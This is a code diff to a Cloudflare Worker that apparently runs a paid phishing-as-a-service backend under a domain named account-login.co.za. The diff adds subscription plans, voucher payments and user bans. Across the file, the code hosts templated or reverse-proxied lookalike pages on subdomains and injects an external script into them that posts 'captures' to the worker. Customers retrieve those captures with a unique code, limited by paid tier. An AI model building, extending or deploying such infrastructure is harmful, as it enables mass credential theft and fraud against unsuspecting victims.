@@ -31,21 +31,17 @@ export default {
     };
 
     // --- 1. ADMIN AUTHENTICATION & ROUTES ---
-    // Check if the request is for an Admin page or Admin API
     const isAdminPath = url.pathname.startsWith('/admin') ||
                         url.pathname === '/api/save' ||
                         (url.pathname === '/api/captures' && request.method === 'GET') ||
                         url.pathname.startsWith('/api/admin');
 
     if (isAdminPath) {
-        // 1.1 Handle Login POST (Publicly accessible to attempt login)
         if (url.pathname === '/admin/login' && request.method === 'POST') {
             return respond(await handleLogin(request));
         }
 
         const isAuth = await checkAuth(request);
-
-        // 1.2 Block Unauthenticated
         if (!isAuth) {
             return respond(new Response(JSON.stringify({ success: false, error: "Unauthorized" }), {
                 status: 401,
@@ -53,7 +49,6 @@ export default {
             }));
         }
 
-        // 1.3 Authenticated Routes
         if (url.pathname === '/api/save' && request.method === 'POST') {
             return respond(await handleSaveRequest(request, env));
         }
@@ -73,44 +68,52 @@ export default {
              if (request.method === 'DELETE') return respond(await handleDeleteSite(request, env));
         }
 
-        // Fallback for admin path
+        // Admin Payment & User Management
+        if (url.pathname === '/api/admin/vouchers') {
+             if (request.method === 'GET') return respond(await handleGetVouchers(env));
+        }
+        if (url.pathname === '/api/admin/voucher_action' && request.method === 'POST') {
+             return respond(await handleVoucherAction(request, env));
+        }
+        if (url.pathname === '/api/admin/users' && request.method === 'GET') {
+             return respond(await handleGetUsers(env));
+        }
+
         return respond(new Response("Not Found", { status: 404 }));
     }
 
     // --- 2. PUBLIC API ENDPOINTS ---
 
-    // Public Captures API (Protected by unique code)
     if (url.pathname === '/api/public/captures') {
         if (request.method === 'GET') return respond(await handleGetPublicCaptures(request, env));
         if (request.method === 'DELETE') return respond(await handleDeletePublicCapture(request, env));
     }
 
-    // Handle Capture Requests (Public)
     if (url.pathname === '/api/capture' && request.method === 'POST') {
       return respond(await handleCaptureRequest(request, env));
     }
 
-    // Handle Public Deployment
     if (url.pathname === '/api/public/deploy' && request.method === 'POST') {
         return respond(await handlePublicDeploy(request, env, ROOT_DOMAIN));
     }
 
-    // Public Templates List
     if (url.pathname === '/api/public/templates' && request.method === 'GET') {
         return respond(await handleGetPublicTemplates(env));
     }
 
-    // --- 3. SUBDOMAIN ROUTING (Serving Deployed Sites) ---
+    // Payment Submission
+    if (url.pathname === '/api/pay' && request.method === 'POST') {
+        return respond(await handlePaymentSubmit(request, env));
+    }
+
+    // --- 3. SUBDOMAIN ROUTING ---
 
     let subdomain = null;
-    // Parse Subdomain
     if (domain !== ROOT_DOMAIN && domain.endsWith("." + ROOT_DOMAIN)) {
         subdomain = domain.slice(0, - (ROOT_DOMAIN.length + 1));
     }
 
-    // Only serve content if we have a valid subdomain
     if (subdomain && subdomain !== 'www') {
-        // Lookup Subdomain in KV
         const data = await env.SUBDOMAINS.get(subdomain, { type: "json" });
 
         if (!data) {
@@ -121,14 +124,12 @@ export default {
         }
 
         if (data.type === 'HTML') {
-          // Serve stored HTML directly
           return new Response(data.content, {
             headers: { 'Content-Type': 'text/html' }
           });
         }
 
         if (data.type === 'PROXY') {
-          // Fetch content from the target URL (Reverse Proxy)
           try {
             const targetUrl = data.content;
             const forwardUrl = new URL(targetUrl);
@@ -150,22 +151,50 @@ export default {
         }
     }
 
-    // Default Response for Root Domain (if accessed via Worker)
     return new Response(JSON.stringify({ message: "D-TECH API Service Online" }), {
         headers: { 'Content-Type': 'application/json' }
     });
   }
 };
 
-// --- HELPER FUNCTIONS ---
+// --- CORE LOGIC & HELPERS ---
+
+async function getUser(env, code) {
+    const key = `user::${code}`;
+    const user = await env.SUBDOMAINS.get(key, { type: "json" });
+    if (!user) {
+        // Default Free User
+        return {
+            plan: 'free', // free, basic, premium
+            strikes: 0,
+            status: 'active', // active, locked, banned
+            created: Date.now(),
+            expiry: null
+        };
+    }
+
+    // Check Expiry
+    if (user.expiry && Date.now() > user.expiry) {
+        user.plan = 'free';
+        user.expiry = null;
+        await env.SUBDOMAINS.put(key, JSON.stringify(user));
+    }
+
+    return user;
+}
+
+async function saveUser(env, code, data) {
+    await env.SUBDOMAINS.put(`user::${code}`, JSON.stringify(data));
+}
+
+// --- HANDLERS ---
 
 function getCorsHeaders(request) {
     const origin = request.headers.get('Origin');
     const allowedDomain = 'https://account-login.co.za';
     const newFrontend = 'https://new.preasx24.co.za';
 
-    // Allow Main Domain
-    if (origin === allowedDomain || origin === newFrontend) {
+    if (origin === allowedDomain || origin === newFrontend || (origin && origin.endsWith('.account-login.co.za'))) {
         return {
             'Access-Control-Allow-Origin': origin,
             'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
@@ -173,32 +202,12 @@ function getCorsHeaders(request) {
             'Access-Control-Allow-Credentials': 'true'
         };
     }
-
-    // Allow Subdomains (mostly for captures)
-    if (origin && origin.endsWith('.account-login.co.za')) {
-         return {
-            'Access-Control-Allow-Origin': origin,
-            'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
-            'Access-Control-Allow-Headers': 'Content-Type',
-            'Access-Control-Allow-Credentials': 'false'
-        };
-    }
-
-    // Fallback for development/testing (optional, remove for prod if strict)
-    // return {
-    //     'Access-Control-Allow-Origin': '*',
-    //     'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
-    //     'Access-Control-Allow-Headers': 'Content-Type'
-    // };
-
     return {};
 }
 
 function handleOptions(request) {
     const headers = getCorsHeaders(request);
-    return new Response(null, {
-        headers: headers
-    });
+    return new Response(null, { headers: headers });
 }
 
 async function checkAuth(request) {
@@ -215,7 +224,6 @@ async function handleLogin(request) {
             return new Response(JSON.stringify({ success: true }), {
                 headers: {
                     'Content-Type': 'application/json',
-                    // SameSite=None; Secure is required for cross-site cookies (GitHub Pages -> Worker)
                     'Set-Cookie': `${COOKIE_NAME}=${PASSWORD}; Path=/; HttpOnly; SameSite=None; Secure; Max-Age=86400`
                 }
             });
@@ -224,9 +232,7 @@ async function handleLogin(request) {
             headers: { 'Content-Type': 'application/json' }
         });
     } catch (e) {
-        return new Response(JSON.stringify({ success: false, error: "Error processing request" }), {
-            headers: { 'Content-Type': 'application/json' }
-        });
+        return jsonError("Error processing request");
     }
 }
 
@@ -234,24 +240,13 @@ async function handleSaveRequest(request, env) {
   try {
     const body = await request.json();
     const { subdomain, type, content } = body;
+    if (!subdomain || !type || !content) return jsonError("Missing fields");
 
-    if (!subdomain || !type || !content) {
-      return new Response(JSON.stringify({ success: false, error: "Missing fields" }), { status: 400 });
-    }
-
-    const entry = {
-      type: type, // 'HTML' or 'PROXY'
-      content: content,
-      updated: Date.now()
-    };
-
+    const entry = { type, content, updated: Date.now() };
     await env.SUBDOMAINS.put(subdomain, JSON.stringify(entry));
-
-    return new Response(JSON.stringify({ success: true, subdomain, type }), {
-      headers: { 'Content-Type': 'application/json' }
-    });
+    return new Response(JSON.stringify({ success: true, subdomain, type }), { headers: { 'Content-Type': 'application/json' } });
   } catch (err) {
-    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
+    return jsonError(err.message, 500);
   }
 }
 
@@ -260,50 +255,38 @@ async function handleCaptureRequest(request, env) {
     const body = await request.json();
     const timestamp = Date.now();
     const uuid = crypto.randomUUID();
-
-    // Extract uniqueCode from body if available
     const uniqueCode = body.uniqueCode || 'default';
     const key = `capture::${uniqueCode}::${timestamp}::${uuid}`;
 
-    // Store the raw captured data
-    await env.SUBDOMAINS.put(key, JSON.stringify({
-      timestamp: timestamp,
-      data: body
-    }));
+    await env.SUBDOMAINS.put(key, JSON.stringify({ timestamp, data: body }));
 
-    return new Response(JSON.stringify({ success: true, key: key }), {
-      headers: { 'Content-Type': 'application/json' }
-    });
+    // Also track capture count for stats if we want (optional, but good for admin)
+    // For now we rely on listing keys.
+
+    return new Response(JSON.stringify({ success: true, key }), { headers: { 'Content-Type': 'application/json' } });
   } catch (err) {
-    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
+    return jsonError(err.message, 500);
   }
 }
 
 async function handleGetCaptures(env) {
   try {
     const list = await env.SUBDOMAINS.list({ prefix: "capture::" });
-    const keys = list.keys;
-    const latestKeys = keys.slice(-20).reverse();
-
-    const promises = latestKeys.map(async (k) => {
+    const keys = list.keys.slice(-20).reverse();
+    const promises = keys.map(async (k) => {
         const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
         return { key: k.name, ...val };
     });
-
     const results = await Promise.all(promises);
-
-    return new Response(JSON.stringify({ success: true, data: results }), {
-      headers: { 'Content-Type': 'application/json' }
-    });
+    return new Response(JSON.stringify({ success: true, data: results }), { headers: { 'Content-Type': 'application/json' } });
   } catch (err) {
-     return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
+     return jsonError(err.message, 500);
   }
 }
 
 async function handleGetTemplates(env) {
     const list = await env.SUBDOMAINS.list({ prefix: "template::" });
-    const keys = list.keys;
-    const templates = await Promise.all(keys.map(async k => {
+    const templates = await Promise.all(list.keys.map(async k => {
         const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
         return { name: k.name.replace("template::", ""), ...val };
     }));
@@ -313,21 +296,17 @@ async function handleGetTemplates(env) {
 async function handleGetSites(env) {
     try {
         const list = await env.SUBDOMAINS.list();
-        const keys = list.keys;
         const sites = [];
-
-        for (const k of keys) {
-            if (!k.name.startsWith('capture::') &&
-                !k.name.startsWith('template::') &&
-                !k.name.startsWith('code_map::')) {
-
-                // Optionally verify it has content/type but for list we just need names
+        for (const k of list.keys) {
+            if (!k.name.startsWith('capture::') && !k.name.startsWith('template::') &&
+                !k.name.startsWith('code_map::') && !k.name.startsWith('user::') &&
+                !k.name.startsWith('voucher_queue')) {
                 sites.push(k.name);
             }
         }
         return new Response(JSON.stringify({ success: true, data: sites }), { headers: { 'Content-Type': 'application/json' } });
     } catch (e) {
-        return new Response(JSON.stringify({ success: false, error: e.message }), { status: 500 });
+        return jsonError(e.message, 500);
     }
 }
 
@@ -340,8 +319,7 @@ async function handleGetPublicTemplates(env) {
 async function handleSaveTemplate(request, env) {
     const body = await request.json();
     const { name, content } = body;
-    if (!name || !content) return new Response(JSON.stringify({ success: false, error: "Missing fields" }), { status: 400 });
-
+    if (!name || !content) return jsonError("Missing fields");
     await env.SUBDOMAINS.put(`template::${name}`, JSON.stringify({ content, updated: Date.now() }));
     return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
 }
@@ -349,8 +327,7 @@ async function handleSaveTemplate(request, env) {
 async function handleDeleteTemplate(request, env) {
     const url = new URL(request.url);
     const name = url.searchParams.get('name');
-    if (!name) return new Response(JSON.stringify({ success: false, error: "Missing name" }), { status: 400 });
-
+    if (!name) return jsonError("Missing name");
     await env.SUBDOMAINS.delete(`template::${name}`);
     return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
 }
@@ -358,17 +335,31 @@ async function handleDeleteTemplate(request, env) {
 async function handleDeleteSite(request, env) {
     const url = new URL(request.url);
     const subdomain = url.searchParams.get('subdomain');
-    if (!subdomain) return new Response(JSON.stringify({ success: false, error: "Missing subdomain" }), { status: 400 });
+    if (!subdomain) return jsonError("Missing subdomain");
 
-    // Try to find associated code map to clean up
+    // Cleanup Code Map if needed (Admin deletion force)
     try {
         const siteData = await env.SUBDOMAINS.get(subdomain, { type: "json" });
         if (siteData && siteData.ownerCode) {
-            await env.SUBDOMAINS.delete(`code_map::${siteData.ownerCode}`);
+            const mapKey = `code_map::${siteData.ownerCode}`;
+            const mapData = await env.SUBDOMAINS.get(mapKey, { type: "json" });
+            if (mapData) {
+                // Handle Array or Object
+                let newSites = [];
+                if (Array.isArray(mapData.sites)) {
+                    newSites = mapData.sites.filter(s => s.subdomain !== subdomain);
+                } else if (mapData.subdomain === subdomain) {
+                    newSites = [];
+                }
+
+                if (newSites.length > 0) {
+                     await env.SUBDOMAINS.put(mapKey, JSON.stringify({ sites: newSites }));
+                } else {
+                     await env.SUBDOMAINS.delete(mapKey);
+                }
+            }
         }
-    } catch (e) {
-        // Ignore if fails, just delete subdomain
-    }
+    } catch (e) {} // Ignore cleanup errors
 
     await env.SUBDOMAINS.delete(subdomain);
     return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
@@ -379,61 +370,89 @@ async function handlePublicDeploy(request, env, rootDomain) {
         const body = await request.json();
         let { subdomain, uniqueCode, templateName, customHtml, enableInjector } = body;
 
-        // Validation
         if (!subdomain || !uniqueCode) return jsonError("Missing subdomain or unique code");
         if (!/^[a-zA-Z0-9-]+$/.test(subdomain)) return jsonError("Invalid subdomain format");
 
-        // Determine Mode
+        // 1. Check User Plan & Limits
+        const user = await getUser(env, uniqueCode);
+
+        if (user.status === 'locked' || user.status === 'banned') {
+            return jsonError("Account is locked due to payment issues. Contact support.");
+        }
+
+        const mapKey = `code_map::${uniqueCode}`;
+        let codeMap = await env.SUBDOMAINS.get(mapKey, { type: "json" });
+
+        // Normalize codeMap to object with sites array
+        let currentSites = [];
+        if (codeMap) {
+            if (Array.isArray(codeMap.sites)) {
+                currentSites = codeMap.sites;
+            } else if (codeMap.subdomain) {
+                // Legacy Format
+                currentSites = [{ subdomain: codeMap.subdomain, created: codeMap.created }];
+            }
+        }
+
+        const limit = user.plan === 'premium' ? 5 : 1;
+
+        if (currentSites.length >= limit) {
+             if (user.plan === 'premium') {
+                 return jsonError(`Premium limit reached (${limit} sites). Delete one to deploy another.`);
+             } else {
+                 // Free/Basic: Auto-replace (delete old)
+                 const oldSite = currentSites[0];
+                 await env.SUBDOMAINS.delete(oldSite.subdomain);
+                 currentSites = [];
+             }
+        }
+
+        // 2. Check Subdomain Availability
+        const existingSub = await env.SUBDOMAINS.get(subdomain);
+        if (existingSub) {
+            // Check if it belongs to this user (replacing own site?)
+            // If we just deleted it above, existingSub would still be found if we didn't wait?
+            // KV is eventually consistent, but delete usually immediate for same colo.
+            // However, to be safe, if we just decided to replace it, we are fine.
+            // But if it's someone ELSE'S subdomain...
+            const siteJson = JSON.parse(existingSub);
+            if (siteJson.ownerCode !== uniqueCode) {
+                return jsonError("Subdomain already taken");
+            }
+        }
+
+        // 3. Prepare Content
         let htmlContent = '';
         let shouldInject = false;
 
         if (templateName) {
-            // Template Mode: Always Inject
             const templateData = await env.SUBDOMAINS.get(`template::${templateName}`, { type: "json" });
             if (!templateData) return jsonError("Template not found");
             htmlContent = templateData.content;
             shouldInject = true;
         } else if (customHtml) {
-            // Custom HTML Mode
             htmlContent = customHtml;
-            // Injector is optional
             shouldInject = (enableInjector === true);
         } else {
             return jsonError("Must provide a template or custom HTML");
         }
 
-        // Check availability
-        const existingSub = await env.SUBDOMAINS.get(subdomain);
-        if (existingSub) return jsonError("Subdomain already taken");
-
-        // Check unique code usage
-        const existingCode = await env.SUBDOMAINS.get(`code_map::${uniqueCode}`);
-        if (existingCode) return jsonError("Unique code already used");
-
-        // --- SCRIPT INJECTION ---
-        // Instead of inlining the code, we link to the external script on GitHub.
         const scriptUrl = 'https://new.preasx24.co.za/injection.js';
-
         if (shouldInject) {
-            // We inject the unique code as a global variable, securely serialized.
             const injectionBlock = `
             <script>
             window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};
             </script>
             <script src="${scriptUrl}"></script>
             `;
-
-            let html = htmlContent;
-            // Inject before </body> if exists, else append
-            if (html.includes('</body>')) {
-                html = html.replace('</body>', `${injectionBlock}</body>`);
+            if (htmlContent.includes('</body>')) {
+                htmlContent = htmlContent.replace('</body>', `${injectionBlock}</body>`);
             } else {
-                html += injectionBlock;
+                htmlContent += injectionBlock;
             }
-            htmlContent = html;
         }
 
-        // Save Subdomain
+        // 4. Save Site
         await env.SUBDOMAINS.put(subdomain, JSON.stringify({
             type: 'HTML',
             content: htmlContent,
@@ -442,11 +461,9 @@ async function handlePublicDeploy(request, env, rootDomain) {
             isInjected: shouldInject
         }));
 
-        // Save Code Map
-        await env.SUBDOMAINS.put(`code_map::${uniqueCode}`, JSON.stringify({
-            subdomain: subdomain,
-            created: Date.now()
-        }));
+        // 5. Update Code Map
+        currentSites.push({ subdomain, created: Date.now() });
+        await env.SUBDOMAINS.put(mapKey, JSON.stringify({ sites: currentSites }));
 
         return new Response(JSON.stringify({ success: true, url: `https://${subdomain}.${rootDomain}` }), {
             headers: { 'Content-Type': 'application/json' }
@@ -461,17 +478,44 @@ async function handleGetPublicCaptures(request, env) {
     const code = url.searchParams.get('code');
     if (!code) return jsonError("Missing code");
 
-    // List keys with prefix 'capture::{code}::'
-    const list = await env.SUBDOMAINS.list({ prefix: `capture::${code}::` });
-    const keys = list.keys.slice(-50).reverse(); // Last 50
+    const user = await getUser(env, code);
 
-    const promises = keys.map(async (k) => {
+    // Check if locked
+    if (user.status === 'locked' || user.status === 'banned') {
+         // Return specialized error or just success:false with status
+         return new Response(JSON.stringify({
+             success: false,
+             error: "Account Locked",
+             accountStatus: user.status
+         }), { headers: { 'Content-Type': 'application/json' } });
+    }
+
+    const list = await env.SUBDOMAINS.list({ prefix: `capture::${code}::` });
+    // Sort latest first
+    const keys = list.keys.reverse();
+    const totalCount = keys.length;
+
+    // Apply Limits
+    let limit = 5; // Free
+    if (user.plan === 'basic') limit = 15;
+    if (user.plan === 'premium') limit = 1000; // Effectively unlimited
+
+    const visibleKeys = keys.slice(0, limit);
+    const hiddenCount = Math.max(0, totalCount - limit);
+
+    const promises = visibleKeys.map(async (k) => {
         const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
         return { key: k.name, ...val };
     });
 
     const results = await Promise.all(promises);
-    return new Response(JSON.stringify({ success: true, data: results }), { headers: { 'Content-Type': 'application/json' } });
+    return new Response(JSON.stringify({
+        success: true,
+        data: results,
+        total: totalCount,
+        hidden: hiddenCount,
+        plan: user.plan
+    }), { headers: { 'Content-Type': 'application/json' } });
 }
 
 async function handleDeletePublicCapture(request, env) {
@@ -480,11 +524,121 @@ async function handleDeletePublicCapture(request, env) {
     const key = url.searchParams.get('key');
     if (!code || !key) return jsonError("Missing fields");
 
-    // Security check: Ensure key belongs to code
     if (!key.startsWith(`capture::${code}::`)) return jsonError("Unauthorized deletion", 403);
 
     await env.SUBDOMAINS.delete(key);
     return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
+}
+
+async function handlePaymentSubmit(request, env) {
+    try {
+        const body = await request.json();
+        const { uniqueCode, voucherType, voucherCode } = body;
+        if (!uniqueCode || !voucherType || !voucherCode) return jsonError("Missing fields");
+
+        const user = await getUser(env, uniqueCode);
+        if (user.status === 'banned') return jsonError("Account is permanently banned.");
+
+        // Determine intended plan based on voucher (Logic? Or assume user selects?)
+        // Let's assume the user selects the plan they are paying for, OR imply it from voucher type?
+        // The prompt says "blue voucher..1voucher etc n they chose".
+        // Let's assume the body includes `targetPlan` or we infer.
+        // I will assume simple logic: 10r = Basic, 20r = Premium.
+        // But the voucher doesn't say the amount until checked.
+        // So I'll provisionally give Premium (or what they asked for).
+        // Let's require `plan` in the body.
+
+        const plan = body.plan || 'premium'; // Default to premium if not specified
+
+        // Update User to Provisional Plan
+        user.plan = plan; // Immediate access
+        // Do NOT update expiry yet (wait for admin)
+
+        await saveUser(env, uniqueCode, user);
+
+        // Add to Admin Queue
+        const voucherId = crypto.randomUUID();
+        const voucherData = {
+            id: voucherId,
+            uniqueCode,
+            voucherType,
+            voucherCode,
+            plan,
+            submitted: Date.now(),
+            status: 'pending'
+        };
+
+        await env.SUBDOMAINS.put(`voucher_queue::${voucherId}`, JSON.stringify(voucherData));
+
+        return new Response(JSON.stringify({ success: true, message: "Payment submitted. Access granted pending review." }), {
+            headers: { 'Content-Type': 'application/json' }
+        });
+    } catch (e) {
+        return jsonError(e.message, 500);
+    }
+}
+
+async function handleGetVouchers(env) {
+    const list = await env.SUBDOMAINS.list({ prefix: "voucher_queue::" });
+    const vouchers = await Promise.all(list.keys.map(async k => {
+        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
+        return val;
+    }));
+    // Filter only pending?
+    const pending = vouchers.filter(v => v.status === 'pending');
+    return new Response(JSON.stringify({ success: true, data: pending }), { headers: { 'Content-Type': 'application/json' } });
+}
+
+async function handleVoucherAction(request, env) {
+    try {
+        const body = await request.json();
+        const { voucherId, action, reason } = body; // action: 'approve' | 'decline'
+
+        const voucherKey = `voucher_queue::${voucherId}`;
+        const voucher = await env.SUBDOMAINS.get(voucherKey, { type: "json" });
+        if (!voucher) return jsonError("Voucher not found");
+
+        const user = await getUser(env, voucher.uniqueCode);
+
+        if (action === 'approve') {
+            // Solidify Plan
+            user.expiry = Date.now() + (30 * 24 * 60 * 60 * 1000); // 30 Days
+            user.status = 'active'; // Ensure active
+            // Strikes reset? Maybe not.
+
+            // Delete from queue or mark processed?
+            await env.SUBDOMAINS.delete(voucherKey);
+
+        } else if (action === 'decline') {
+            // Revert Plan
+            user.plan = 'free';
+            user.status = 'locked'; // "Serious Red Warning"
+            user.strikes = (user.strikes || 0) + 1;
+            user.lockReason = reason || "Invalid Voucher";
+
+            if (user.strikes >= 2) {
+                user.status = 'banned';
+            }
+
+            await env.SUBDOMAINS.delete(voucherKey);
+        }
+
+        await saveUser(env, voucher.uniqueCode, user);
+
+        return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
+    } catch (e) {
+        return jsonError(e.message, 500);
+    }
+}
+
+async function handleGetUsers(env) {
+    // This is expensive if many users. For now, we list `user::` prefix.
+    const list = await env.SUBDOMAINS.list({ prefix: "user::" });
+    const users = await Promise.all(list.keys.map(async k => {
+        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
+        return { code: k.name.replace("user::", ""), ...val };
+    }));
+    return new Response(JSON.stringify({ success: true, data: users }), { headers: { 'Content-Type': 'application/json' } });
 }
 
 function jsonError(msg, status = 400) {
